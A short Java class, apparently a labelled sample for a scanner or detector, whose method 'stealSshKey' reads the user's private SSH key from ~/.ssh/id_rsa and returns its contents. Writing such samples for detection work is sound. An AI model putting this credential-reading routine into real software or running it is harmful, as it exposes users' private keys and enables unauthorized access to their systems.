package suspicious;

import java.io.File;
import java.io.FileInputStream;

public class SuspiciousRecon {
    public byte[] stealSshKey() throws Exception {
        String home = System.getProperty("user.home");
        File key = new File(home, ".ssh/id_rsa");
        FileInputStream fis = new FileInputStream(key);
        byte[] b = new byte[(int)key.length()];
        fis.read(b);
        fis.close();
        return b;
    }
}